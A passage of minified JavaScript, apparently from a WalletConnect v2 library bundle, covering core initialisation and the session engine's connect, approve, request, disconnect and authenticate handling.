        Ur(this, "heartbeat"),
        Ur(this, "relayer"),
        Ur(this, "crypto"),
        Ur(this, "storage"),
        Ur(this, "history"),
        Ur(this, "expirer"),
        Ur(this, "pairing"),
        Ur(this, "verify"),
        Ur(this, "echoClient"),
        Ur(this, "linkModeSupportedApps"),
        Ur(this, "eventClient"),
        Ur(this, "initialized", !1),
        Ur(this, "logChunkController"),
        Ur(this, "on", (a, l) => this.events.on(a, l)),
        Ur(this, "once", (a, l) => this.events.once(a, l)),
        Ur(this, "off", (a, l) => this.events.off(a, l)),
        Ur(this, "removeListener", (a, l) => this.events.removeListener(a, l)),
        Ur(this, "dispatchEnvelope", ({topic: a, message: l, sessionExists: f}) => {
            if (!a || !l)
                return;
            const h = {
                topic: a,
                message: l,
                publishedAt: Date.now(),
                transportType: kr.link_mode
            };
            this.relayer.onLinkMessageEvent(h, {
                sessionExists: f
            })
        }
        );
        const o = this.getGlobalCore(e == null ? void 0 : e.customStoragePrefix);
        if (o)
            try {
                return this.customStoragePrefix = o.customStoragePrefix,
                this.logger = o.logger,
                this.heartbeat = o.heartbeat,
                this.crypto = o.crypto,
                this.history = o.history,
                this.expirer = o.expirer,
                this.storage = o.storage,
                this.relayer = o.relayer,
                this.pairing = o.pairing,
                this.verify = o.verify,
                this.echoClient = o.echoClient,
                this.linkModeSupportedApps = o.linkModeSupportedApps,
                this.eventClient = o.eventClient,
                this.initialized = o.initialized,
                this.logChunkController = o.logChunkController,
                o
            } catch (a) {
                console.warn("Failed to copy global core", a)
            }
        this.projectId = e == null ? void 0 : e.projectId,
        this.relayUrl = (e == null ? void 0 : e.relayUrl) || uD,
        this.customStoragePrefix = e != null && e.customStoragePrefix ? `:${e.customStoragePrefix}` : "";
        const i = m3({
            level: typeof (e == null ? void 0 : e.logger) == "string" && e.logger ? e.logger : boe.logger,
            name: YE
        })
          , {logger: n, chunkLoggerController: s} = $K({
            opts: i,
            maxSizeInBytes: e == null ? void 0 : e.maxLogBlobSizeInBytes,
            loggerOverride: e == null ? void 0 : e.logger
        });
        this.logChunkController = s,
        (t = this.logChunkController) != null && t.downloadLogsBlobInBrowser && (window.downloadLogsBlobInBrowser = async () => {
            var a, l;
            (a = this.logChunkController) != null && a.downloadLogsBlobInBrowser && ((l = this.logChunkController) == null || l.downloadLogsBlobInBrowser({
                clientId: await this.crypto.getClientId()
            }))
        }
        ),
        this.logger = xo(n, this.name),
        this.heartbeat = new zG,
        this.crypto = new Ase(this,this.logger,e == null ? void 0 : e.keychain),
        this.history = new Mae(this,this.logger),
        this.expirer = new Fae(this,this.logger),
        this.storage = e != null && e.storage ? e.storage : new AK(K_(K_({}, moe), e == null ? void 0 : e.storageOptions)),
        this.relayer = new Xse({
            core: this,
            logger: this.logger,
            relayUrl: this.relayUrl,
            projectId: this.projectId
        }),
        this.pairing = new Oae(this,this.logger),
        this.verify = new Lae(this,this.logger,this.storage),
        this.echoClient = new jae(this.projectId || "",this.logger),
        this.linkModeSupportedApps = [],
        this.eventClient = new Gae(this,this.logger,e == null ? void 0 : e.telemetryEnabled),
        this.setGlobalCore(this)
    }
    static async init(e) {
        const t = new U3(e);
        await t.initialize();
        const o = await t.crypto.getClientId();
        return await t.storage.setItem(Ooe, o),
        t
    }
    get context() {
        return zo(this.logger)
    }
    async start() {
        this.initialized || await this.initialize()
    }
    async getLogsBlob() {
        var e;
        return (e = this.logChunkController) == null ? void 0 : e.logsToBlob({
            clientId: await this.crypto.getClientId()
        })
    }
    async addLinkModeSupportedApp(e) {
        this.linkModeSupportedApps.includes(e) || (this.linkModeSupportedApps.push(e),
        await this.storage.setItem(S_, this.linkModeSupportedApps))
    }
    async initialize() {
        this.logger.trace("Initialized");
        try {
            await this.crypto.init(),
            await this.history.init(),
            await this.expirer.init(),
            await this.relayer.init(),
            await this.heartbeat.init(),
            await this.pairing.init(),
            this.linkModeSupportedApps = await this.storage.getItem(S_) || [],
            this.initialized = !0,
            this.logger.info("Core Initialization Success")
        } catch (e) {
            throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`, e),
            this.logger.error(e.message),
            e
        }
    }
    getGlobalCore(e="") {
        try {
            if (this.isGlobalCoreDisabled())
                return;
            const t = `_walletConnectCore_${e}`
              , o = `${t}_count`;
            return globalThis[o] = (globalThis[o] || 0) + 1,
            globalThis[o] > 1 && console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[o]} times.`),
            globalThis[t]
        } catch (t) {
            console.warn("Failed to get global WalletConnect core", t);
            return
        }
    }
    setGlobalCore(e) {
        var t;
        try {
            if (this.isGlobalCoreDisabled())
                return;
            const o = `_walletConnectCore_${((t = e.opts) == null ? void 0 : t.customStoragePrefix) || ""}`;
            globalThis[o] = e
        } catch (o) {
            console.warn("Failed to set global WalletConnect core", o)
        }
    }
    isGlobalCoreDisabled() {
        try {
            return typeof process < "u" && yoe.DISABLE_GLOBAL_CORE === "true"
        } catch {
            return !0
        }
    }
}
const Xae = U3
  , TD = "wc"
  , ED = 2
  , AD = "client"
  , k3 = `${TD}@${ED}:${AD}:`
  , S2 = {
    name: AD,
    logger: "error"
}
  , Z_ = "WALLETCONNECT_DEEPLINK_CHOICE"
  , Jae = "proposal"
  , Y_ = "Proposal expired"
  , Qae = "session"
  , vf = Ze.SEVEN_DAYS
  , ece = "engine"
  , An = {
    wc_sessionPropose: {
        req: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !0,
            tag: 1100
        },
        res: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1101
        },
        reject: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1120
        },
        autoReject: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1121
        }
    },
    wc_sessionSettle: {
        req: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1102
        },
        res: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1103
        }
    },
    wc_sessionUpdate: {
        req: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1104
        },
        res: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1105
        }
    },
    wc_sessionExtend: {
        req: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1106
        },
        res: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1107
        }
    },
    wc_sessionRequest: {
        req: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !0,
            tag: 1108
        },
        res: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1109
        }
    },
    wc_sessionEvent: {
        req: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !0,
            tag: 1110
        },
        res: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1111
        }
    },
    wc_sessionDelete: {
        req: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1112
        },
        res: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1113
        }
    },
    wc_sessionPing: {
        req: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1114
        },
        res: {
            ttl: Ze.ONE_DAY,
            prompt: !1,
            tag: 1115
        }
    },
    wc_sessionAuthenticate: {
        req: {
            ttl: Ze.ONE_HOUR,
            prompt: !0,
            tag: 1116
        },
        res: {
            ttl: Ze.ONE_HOUR,
            prompt: !1,
            tag: 1117
        },
        reject: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1118
        },
        autoReject: {
            ttl: Ze.FIVE_MINUTES,
            prompt: !1,
            tag: 1119
        }
    }
}
  , B2 = {
    min: Ze.FIVE_MINUTES,
    max: Ze.SEVEN_DAYS
}
  , _s = {
    idle: "IDLE",
    active: "ACTIVE"
}
  , X_ = {
    eth_sendTransaction: {
        key: ""
    },
    eth_sendRawTransaction: {
        key: ""
    },
    wallet_sendCalls: {
        key: ""
    },
    solana_signTransaction: {
        key: "signature"
    },
    solana_signAllTransactions: {
        key: "transactions"
    },
    solana_signAndSendTransaction: {
        key: "signature"
    }
}
  , tce = "request"
  , rce = ["wc_sessionPropose", "wc_sessionRequest", "wc_authRequest", "wc_sessionAuthenticate"]
  , nce = "wc"
  , oce = "auth"
  , ice = "authKeys"
  , sce = "pairingTopics"
  , ace = "requests"
  , L1 = `${nce}@${1.5}:${oce}:`
  , Pm = `${L1}:PUB_KEY`;
var cce = Object.defineProperty
  , lce = Object.defineProperties
  , uce = Object.getOwnPropertyDescriptors
  , J_ = Object.getOwnPropertySymbols
  , fce = Object.prototype.hasOwnProperty
  , dce = Object.prototype.propertyIsEnumerable
  , aA = (r, e, t) => e in r ? cce(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , Mr = (r, e) => {
    for (var t in e || (e = {}))
        fce.call(e, t) && aA(r, t, e[t]);
    if (J_)
        for (var t of J_(e))
            dce.call(e, t) && aA(r, t, e[t]);
    return r
}
  , so = (r, e) => lce(r, uce(e))
  , qe = (r, e, t) => aA(r, typeof e != "symbol" ? e + "" : e, t);
class hce extends aZ {
    constructor(e) {
        super(e),
        qe(this, "name", ece),
        qe(this, "events", new bM),
        qe(this, "initialized", !1),
        qe(this, "requestQueue", {
            state: _s.idle,
            queue: []
        }),
        qe(this, "sessionRequestQueue", {
            state: _s.idle,
            queue: []
        }),
        qe(this, "requestQueueDelay", Ze.ONE_SECOND),
        qe(this, "expectedPairingMethodMap", new Map),
        qe(this, "recentlyDeletedMap", new Map),
        qe(this, "recentlyDeletedLimit", 200),
        qe(this, "relayMessageCache", []),
        qe(this, "pendingSessions", new Map),
        qe(this, "init", async () => {
            this.initialized || (await this.cleanup(),
            this.registerRelayerEvents(),
            this.registerExpirerEvents(),
            this.registerPairingEvents(),
            await this.registerLinkModeListeners(),
            this.client.core.pairing.register({
                methods: Object.keys(An)
            }),
            this.initialized = !0,
            setTimeout(async () => {
                await this.processPendingMessageEvents(),
                this.sessionRequestQueue.queue = this.getPendingSessionRequests(),
                this.processSessionRequestQueue()
            }
            , Ze.toMiliseconds(this.requestQueueDelay)))
        }
        ),
        qe(this, "connect", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            const o = so(Mr({}, t), {
                requiredNamespaces: t.requiredNamespaces || {},
                optionalNamespaces: t.optionalNamespaces || {}
            });
            await this.isValidConnect(o),
            o.optionalNamespaces = dne(o.requiredNamespaces, o.optionalNamespaces),
            o.requiredNamespaces = {};
            const {pairingTopic: i, requiredNamespaces: n, optionalNamespaces: s, sessionProperties: a, scopedProperties: l, relays: f} = o;
            let h = i, p, b = !1;
            try {
                if (h) {
                    const I = this.client.core.pairing.pairings.get(h);
                    this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),
                    b = I.active
                }
            } catch (I) {
                throw this.client.logger.error(`connect() -> pairing.get(${h}) failed`),
                I
            }
            if (!h || !b) {
                const {topic: I, uri: M} = await this.client.core.pairing.create();
                h = I,
                p = M
            }
            if (!h) {
                const {message: I} = Xe("NO_MATCHING_KEY", `connect() pairing topic: ${h}`);
                throw new Error(I)
            }
            const v = await this.client.core.crypto.generateKeyPair()
              , T = An.wc_sessionPropose.req.ttl || Ze.FIVE_MINUTES
              , x = yn(T)
              , E = so(Mr(Mr({
                requiredNamespaces: n,
                optionalNamespaces: s,
                relays: f ?? [{
                    protocol: lD
                }],
                proposer: {
                    publicKey: v,
                    metadata: this.client.metadata
                },
                expiryTimestamp: x,
                pairingTopic: h
            }, a && {
                sessionProperties: a
            }), l && {
                scopedProperties: l
            }), {
                id: Ns()
            })
              , B = wr("session_connect", E.id)
              , {reject: P, resolve: O, done: F} = Il(T, Y_)
              , D = ({id: I}) => {
                I === E.id && (this.client.events.off("proposal_expire", D),
                this.pendingSessions.delete(E.id),
                this.events.emit(B, {
                    error: {
                        message: Y_,
                        code: 0
                    }
                }))
            }
            ;
            return this.client.events.on("proposal_expire", D),
            this.events.once(B, ({error: I, session: M}) => {
                this.client.events.off("proposal_expire", D),
                I ? P(I) : M && O(M)
            }
            ),
            await this.sendRequest({
                topic: h,
                method: "wc_sessionPropose",
                params: E,
                throwOnFailedPublish: !0,
                clientRpcId: E.id
            }),
            await this.setProposal(E.id, E),
            {
                uri: p,
                approval: F
            }
        }
        ),
        qe(this, "pair", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                return await this.client.core.pairing.pair(t)
            } catch (o) {
                throw this.client.logger.error("pair() failed"),
                o
            }
        }
        ),
        qe(this, "approve", async t => {
            var o, i, n;
            const s = this.client.core.eventClient.createEvent({
                properties: {
                    topic: (o = t == null ? void 0 : t.id) == null ? void 0 : o.toString(),
                    trace: [Zi.session_approve_started]
                }
            });
            try {
                this.isInitialized(),
                await this.confirmOnlineStateOrThrow()
            } catch (W) {
                throw s.setError(Pl.no_internet_connection),
                W
            }
            try {
                await this.isValidProposalId(t == null ? void 0 : t.id)
            } catch (W) {
                throw this.client.logger.error(`approve() -> proposal.get(${t == null ? void 0 : t.id}) failed`),
                s.setError(Pl.proposal_not_found),
                W
            }
            try {
                await this.isValidApprove(t)
            } catch (W) {
                throw this.client.logger.error("approve() -> isValidApprove() failed"),
                s.setError(Pl.session_approve_namespace_validation_failure),
                W
            }
            const {id: a, relayProtocol: l, namespaces: f, sessionProperties: h, scopedProperties: p, sessionConfig: b} = t
              , v = this.client.proposal.get(a);
            this.client.core.eventClient.deleteEvent({
                eventId: s.eventId
            });
            const {pairingTopic: T, proposer: x, requiredNamespaces: E, optionalNamespaces: B} = v;
            let P = (i = this.client.core.eventClient) == null ? void 0 : i.getEvent({
                topic: T
            });
            P || (P = (n = this.client.core.eventClient) == null ? void 0 : n.createEvent({
                type: Zi.session_approve_started,
                properties: {
                    topic: T,
                    trace: [Zi.session_approve_started, Zi.session_namespaces_validation_success]
                }
            }));
            const O = await this.client.core.crypto.generateKeyPair()
              , F = x.publicKey
              , D = await this.client.core.crypto.generateSharedKey(O, F)
              , I = Mr(Mr(Mr({
                relay: {
                    protocol: l ?? "irn"
                },
                namespaces: f,
                controller: {
                    publicKey: O,
                    metadata: this.client.metadata
                },
                expiry: yn(vf)
            }, h && {
                sessionProperties: h
            }), p && {
                scopedProperties: p
            }), b && {
                sessionConfig: b
            })
              , M = kr.relay;
            P.addTrace(Zi.subscribing_session_topic);
            try {
                await this.client.core.relayer.subscribe(D, {
                    transportType: M
                })
            } catch (W) {
                throw P.setError(Pl.subscribe_session_topic_failure),
                W
            }
            P.addTrace(Zi.subscribe_session_topic_success);
            const C = so(Mr({}, I), {
                topic: D,
                requiredNamespaces: E,
                optionalNamespaces: B,
                pairingTopic: T,
                acknowledged: !1,
                self: I.controller,
                peer: {
                    publicKey: x.publicKey,
                    metadata: x.metadata
                },
                controller: O,
                transportType: kr.relay
            });
            await this.client.session.set(D, C),
            P.addTrace(Zi.store_session);
            try {
                P.addTrace(Zi.publishing_session_settle),
                await this.sendRequest({
                    topic: D,
                    method: "wc_sessionSettle",
                    params: I,
                    throwOnFailedPublish: !0
                }).catch(W => {
                    throw P == null || P.setError(Pl.session_settle_publish_failure),
                    W
                }
                ),
                P.addTrace(Zi.session_settle_publish_success),
                P.addTrace(Zi.publishing_session_approve),
                await this.sendResult({
                    id: a,
                    topic: T,
                    result: {
                        relay: {
                            protocol: l ?? "irn"
                        },
                        responderPublicKey: O
                    },
                    throwOnFailedPublish: !0
                }).catch(W => {
                    throw P == null || P.setError(Pl.session_approve_publish_failure),
                    W
                }
                ),
                P.addTrace(Zi.session_approve_publish_success)
            } catch (W) {
                throw this.client.logger.error(W),
                this.client.session.delete(D, Nr("USER_DISCONNECTED")),
                await this.client.core.relayer.unsubscribe(D),
                W
            }
            return this.client.core.eventClient.deleteEvent({
                eventId: P.eventId
            }),
            await this.client.core.pairing.updateMetadata({
                topic: T,
                metadata: x.metadata
            }),
            await this.client.proposal.delete(a, Nr("USER_DISCONNECTED")),
            await this.client.core.pairing.activate({
                topic: T
            }),
            await this.setExpiry(D, yn(vf)),
            {
                topic: D,
                acknowledged: () => Promise.resolve(this.client.session.get(D))
            }
        }
        ),
        qe(this, "reject", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidReject(t)
            } catch (s) {
                throw this.client.logger.error("reject() -> isValidReject() failed"),
                s
            }
            const {id: o, reason: i} = t;
            let n;
            try {
                n = this.client.proposal.get(o).pairingTopic
            } catch (s) {
                throw this.client.logger.error(`reject() -> proposal.get(${o}) failed`),
                s
            }
            n && (await this.sendError({
                id: o,
                topic: n,
                error: i,
                rpcOpts: An.wc_sessionPropose.reject
            }),
            await this.client.proposal.delete(o, Nr("USER_DISCONNECTED")))
        }
        ),
        qe(this, "update", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidUpdate(t)
            } catch (p) {
                throw this.client.logger.error("update() -> isValidUpdate() failed"),
                p
            }
            const {topic: o, namespaces: i} = t
              , {done: n, resolve: s, reject: a} = Il()
              , l = Ns()
              , f = zl().toString()
              , h = this.client.session.get(o).namespaces;
            return this.events.once(wr("session_update", l), ({error: p}) => {
                p ? a(p) : s()
            }
            ),
            await this.client.session.update(o, {
                namespaces: i
            }),
            await this.sendRequest({
                topic: o,
                method: "wc_sessionUpdate",
                params: {
                    namespaces: i
                },
                throwOnFailedPublish: !0,
                clientRpcId: l,
                relayRpcId: f
            }).catch(p => {
                this.client.logger.error(p),
                this.client.session.update(o, {
                    namespaces: h
                }),
                a(p)
            }
            ),
            {
                acknowledged: n
            }
        }
        ),
        qe(this, "extend", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidExtend(t)
            } catch (l) {
                throw this.client.logger.error("extend() -> isValidExtend() failed"),
                l
            }
            const {topic: o} = t
              , i = Ns()
              , {done: n, resolve: s, reject: a} = Il();
            return this.events.once(wr("session_extend", i), ({error: l}) => {
                l ? a(l) : s()
            }
            ),
            await this.setExpiry(o, yn(vf)),
            this.sendRequest({
                topic: o,
                method: "wc_sessionExtend",
                params: {},
                clientRpcId: i,
                throwOnFailedPublish: !0
            }).catch(l => {
                a(l)
            }
            ),
            {
                acknowledged: n
            }
        }
        ),
        qe(this, "request", async t => {
            this.isInitialized();
            try {
                await this.isValidRequest(t)
            } catch (B) {
                throw this.client.logger.error("request() -> isValidRequest() failed"),
                B
            }
            const {chainId: o, request: i, topic: n, expiry: s=An.wc_sessionRequest.req.ttl} = t
              , a = this.client.session.get(n);
            (a == null ? void 0 : a.transportType) === kr.relay && await this.confirmOnlineStateOrThrow();
            const l = Ns()
              , f = zl().toString()
              , {done: h, resolve: p, reject: b} = Il(s, "Request expired. Please try again.");
            this.events.once(wr("session_request", l), ({error: B, result: P}) => {
                B ? b(B) : p(P)
            }
            );
            const v = "wc_sessionRequest"
              , T = this.getAppLinkIfEnabled(a.peer.metadata, a.transportType);
            if (T)
                return await this.sendRequest({
                    clientRpcId: l,
                    relayRpcId: f,
                    topic: n,
                    method: v,
                    params: {
                        request: so(Mr({}, i), {
                            expiryTimestamp: yn(s)
                        }),
                        chainId: o
                    },
                    expiry: s,
                    throwOnFailedPublish: !0,
                    appLink: T
                }).catch(B => b(B)),
                this.client.events.emit("session_request_sent", {
                    topic: n,
                    request: i,
                    chainId: o,
                    id: l
                }),
                await h();
            const x = {
                request: so(Mr({}, i), {
                    expiryTimestamp: yn(s)
                }),
                chainId: o
            }
              , E = this.shouldSetTVF(v, x);
            return await Promise.all([new Promise(async B => {
                await this.sendRequest(Mr({
                    clientRpcId: l,
                    relayRpcId: f,
                    topic: n,
                    method: v,
                    params: x,
                    expiry: s,
                    throwOnFailedPublish: !0
                }, E && {
                    tvf: this.getTVFParams(l, x)
                })).catch(P => b(P)),
                this.client.events.emit("session_request_sent", {
                    topic: n,
                    request: i,
                    chainId: o,
                    id: l
                }),
                B()
            }
            ), new Promise(async B => {
                var P;
                if (!((P = a.sessionConfig) != null && P.disableDeepLink)) {
                    const O = await Aee(this.client.core.storage, Z_);
                    await vee({
                        id: l,
                        topic: n,
                        wcDeepLink: O
                    })
                }
                B()
            }
            ), h()]).then(B => B[2])
        }
        ),
        qe(this, "respond", async t => {
            this.isInitialized(),
            await this.isValidRespond(t);
            const {topic: o, response: i} = t
              , {id: n} = i
              , s = this.client.session.get(o);
            s.transportType === kr.relay && await this.confirmOnlineStateOrThrow();
            const a = this.getAppLinkIfEnabled(s.peer.metadata, s.transportType);
            Ds(i) ? await this.sendResult({
                id: n,
                topic: o,
                result: i.result,
                throwOnFailedPublish: !0,
                appLink: a
            }) : Ni(i) && await this.sendError({
                id: n,
                topic: o,
                error: i.error,
                appLink: a
            }),
            this.cleanupAfterResponse(t)
        }
        ),
        qe(this, "ping", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidPing(t)
            } catch (i) {
                throw this.client.logger.error("ping() -> isValidPing() failed"),
                i
            }
            const {topic: o} = t;
            if (this.client.session.keys.includes(o)) {
                const i = Ns()
                  , n = zl().toString()
                  , {done: s, resolve: a, reject: l} = Il();
                this.events.once(wr("session_ping", i), ({error: f}) => {
                    f ? l(f) : a()
                }
                ),
                await Promise.all([this.sendRequest({
                    topic: o,
                    method: "wc_sessionPing",
                    params: {},
                    throwOnFailedPublish: !0,
                    clientRpcId: i,
                    relayRpcId: n
                }), s()])
            } else
                this.client.core.pairing.pairings.keys.includes(o) && (this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),
                await this.client.core.pairing.ping({
                    topic: o
                }))
        }
        ),
        qe(this, "emit", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow(),
            await this.isValidEmit(t);
            const {topic: o, event: i, chainId: n} = t
              , s = zl().toString()
              , a = Ns();
            await this.sendRequest({
                topic: o,
                method: "wc_sessionEvent",
                params: {
                    event: i,
                    chainId: n
                },
                throwOnFailedPublish: !0,
                relayRpcId: s,
                clientRpcId: a
            })
        }
        ),
        qe(this, "disconnect", async t => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow(),
            await this.isValidDisconnect(t);
            const {topic: o} = t;
            if (this.client.session.keys.includes(o))
                await this.sendRequest({
                    topic: o,
                    method: "wc_sessionDelete",
                    params: Nr("USER_DISCONNECTED"),
                    throwOnFailedPublish: !0
                }),
                await this.deleteSession({
                    topic: o,
                    emitEvent: !1
                });
            else if (this.client.core.pairing.pairings.keys.includes(o))
                await this.client.core.pairing.disconnect({
                    topic: o
                });
            else {
                const {message: i} = Xe("MISMATCHED_TOPIC", `Session or pairing topic not found: ${o}`);
                throw new Error(i)
            }
        }
        ),
        qe(this, "find", t => (this.isInitialized(),
        this.client.session.getAll().filter(o => gne(o, t)))),
        qe(this, "getPendingSessionRequests", () => this.client.pendingRequest.getAll()),
        qe(this, "authenticate", async (t, o) => {
            var i;
            this.isInitialized(),
            this.isValidAuthenticate(t);
            const n = o && this.client.core.linkModeSupportedApps.includes(o) && ((i = this.client.metadata.redirect) == null ? void 0 : i.linkMode)
              , s = n ? kr.link_mode : kr.relay;
            s === kr.relay && await this.confirmOnlineStateOrThrow();
            const {chains: a, statement: l="", uri: f, domain: h, nonce: p, type: b, exp: v, nbf: T, methods: x=[], expiry: E} = t
              , B = [...t.resources || []]
              , {topic: P, uri: O} = await this.client.core.pairing.create({
                methods: ["wc_sessionAuthenticate"],
                transportType: s
            });
            this.client.logger.info({
                message: "Generated new pairing",
                pairing: {
                    topic: P,
                    uri: O
                }
            });
            const F = await this.client.core.crypto.generateKeyPair()
              , D = Em(F);
            if (await Promise.all([this.client.auth.authKeys.set(Pm, {
                responseTopic: D,
                publicKey: F
            }), this.client.auth.pairingTopics.set(D, {
                topic: D,
                pairingTopic: P
            })]),
            await this.client.core.relayer.subscribe(D, {
                transportType: s
            }),
            this.client.logger.info(`sending request to new pairing topic: ${P}`),
            x.length > 0) {
                const {namespace: K} = vm(a[0]);
                let j = yte(K, "request", x);
                Tm(B) && (j = mte(j, B.pop())),
                B.push(j)
            }
            const I = E && E > An.wc_sessionAuthenticate.req.ttl ? E : An.wc_sessionAuthenticate.req.ttl
              , M = {
                authPayload: {
                    type: b ?? "caip122",
                    chains: a,
                    statement: l,
                    aud: f,
                    domain: h,
                    version: "1",
                    nonce: p,
                    iat: new Date().toISOString(),
                    exp: v,
                    nbf: T,
                    resources: B
                },
                requester: {
                    publicKey: F,
                    metadata: this.client.metadata
                },
                expiryTimestamp: yn(I)
            }
              , C = {
                eip155: {
                    chains: a,
                    methods: [...new Set(["personal_sign", ...x])],
                    events: ["chainChanged", "accountsChanged"]
                }
            }
              , W = {
                requiredNamespaces: {},
                optionalNamespaces: C,
                relays: [{
                    protocol: "irn"
                }],
                pairingTopic: P,
                proposer: {
                    publicKey: F,
                    metadata: this.client.metadata
                },
                expiryTimestamp: yn(An.wc_sessionPropose.req.ttl),
                id: Ns()
            }
              , {done: k, resolve: H, reject: X} = Il(I, "Request expired")
              , Y = Ns()
              , V = wr("session_connect", W.id)
              , R = wr("session_request", Y)
              , _ = async ({error: K, session: j}) => {
                this.events.off(R, $),
                K ? X(K) : j && H({
                    session: j
                })
            }
              , $ = async K => {
                var j, ee, ie;
                if (await this.deletePendingAuthRequest(Y, {
                    message: "fulfilled",
                    code: 0
                }),
                K.error) {
                    const Je = Nr("WC_METHOD_UNSUPPORTED", "wc_sessionAuthenticate");
                    return K.error.code === Je.code ? void 0 : (this.events.off(V, _),
                    X(K.error.message))
                }
                await this.deleteProposal(W.id),
                this.events.off(V, _);
                const {cacaos: ae, responder: he} = K.result
                  , me = []
                  , Pe = [];
                for (const Je of ae) {
                    await kB({
                        cacao: Je,
                        projectId: this.client.core.projectId
                    }) || (this.client.logger.error(Je, "Signature verification failed"),
                    X(Nr("SESSION_SETTLEMENT_FAILED", "Signature verification failed")));
                    const {p: rt} = Je
                      , xt = Tm(rt.resources)
                      , Tt = [LE(rt.iss)]
                      , Qe = o1(rt.iss);
                    if (xt) {
                        const Ye = LB(xt)
                          , Bt = $B(xt);
                        me.push(...Ye),
                        Tt.push(...Bt)
                    }
                    for (const Ye of Tt)
                        Pe.push(`${Ye}:${Qe}`)
                }
                const _e = await this.client.core.crypto.generateSharedKey(F, he.publicKey);
                let Fe;
                me.length > 0 && (Fe = {
                    topic: _e,
                    acknowledged: !0,
                    self: {
                        publicKey: F,
                        metadata: this.client.metadata
                    },
                    peer: he,
                    controller: he.publicKey,
                    expiry: yn(vf),
                    requiredNamespaces: {},
                    optionalNamespaces: {},
                    relay: {
                        protocol: "irn"
                    },
                    pairingTopic: P,
                    namespaces: d_([...new Set(me)], [...new Set(Pe)]),
                    transportType: s
                },
                await this.client.core.relayer.subscribe(_e, {
                    transportType: s
                }),
                await this.client.session.set(_e, Fe),
                P && await this.client.core.pairing.updateMetadata({
                    topic: P,
                    metadata: he.metadata
                }),
                Fe = this.client.session.get(_e)),
                (j = this.client.metadata.redirect) != null && j.linkMode && (ee = he.metadata.redirect) != null && ee.linkMode && (ie = he.metadata.redirect) != null && ie.universal && o && (this.client.core.addLinkModeSupportedApp(he.metadata.redirect.universal),
                this.client.session.update(_e, {
                    transportType: kr.link_mode
                })),
                H({
                    auths: ae,
                    session: Fe
                })
            }
            ;
            this.events.once(V, _),
            this.events.once(R, $);
            let z;
            try {
                if (n) {
                    const K = jl("wc_sessionAuthenticate", M, Y);
                    this.client.core.history.set(P, K);
                    const j = await this.client.core.crypto.encode("", K, {
                        type: A0,
                        encoding: Nc
                    });
                    z = hy(o, P, j)
                } else
                    await Promise.all([this.sendRequest({
                        topic: P,
                        method: "wc_sessionAuthenticate",
                        params: M,
                        expiry: t.expiry,
                        throwOnFailedPublish: !0,
                        clientRpcId: Y
                    }), this.sendRequest({
                        topic: P,
                        method: "wc_sessionPropose",
                        params: W,
                        expiry: An.wc_sessionPropose.req.ttl,
                        throwOnFailedPublish: !0,
                        clientRpcId: W.id
                    })])
            } catch (K) {
                throw this.events.off(V, _),
                this.events.off(R, $),
                K
            }
            return await this.setProposal(W.id, W),
            await this.setAuthRequest(Y, {
                request: so(Mr({}, M), {
                    verifyContext: {}
                }),
                pairingTopic: P,
                transportType: s
            }),
            {
                uri: z ?? O,
                response: k
            }
        }
        ),
        qe(this, "approveSessionAuthenticate", async t => {
            const {id: o, auths: i} = t
              , n = this.client.core.eventClient.createEvent({
                properties: {
                    topic: o.toString(),
                    trace: [Cl.authenticated_session_approve_started]
                }
            });
            try {
                this.isInitialized()
            } catch (E) {
                throw n.setError(bp.no_internet_connection),
                E
            }
            const s = this.getPendingAuthRequest(o);
            if (!s)
                throw n.setError(bp.authenticated_session_pending_request_not_found),
                new Error(`Could not find pending auth request with id ${o}`);
            const a = s.transportType || kr.relay;
            a === kr.relay && await this.confirmOnlineStateOrThrow();
            const l = s.requester.publicKey
              , f = await this.client.core.crypto.generateKeyPair()
              , h = Em(l)
              , p = {
                type: ja,
                receiverPublicKey: l,
                senderPublicKey: f
            }
              , b = []
              , v = [];
            for (const E of i) {
                if (!await kB({
                    cacao: E,
                    projectId: this.client.core.projectId
                })) {
                    n.setError(bp.invalid_cacao);
                    const D = Nr("SESSION_SETTLEMENT_FAILED", "Signature verification failed");
                    throw await this.sendError({
                        id: o,
                        topic: h,
                        error: D,
                        encodeOpts: p
                    }),
                    new Error(D.message)
                }
                n.addTrace(Cl.cacaos_verified);
                const {p: B} = E
                  , P = Tm(B.resources)
                  , O = [LE(B.iss)]
                  , F = o1(B.iss);
                if (P) {
                    const D = LB(P)
                      , I = $B(P);
                    b.push(...D),
                    O.push(...I)
                }
                for (const D of O)
                    v.push(`${D}:${F}`)
            }
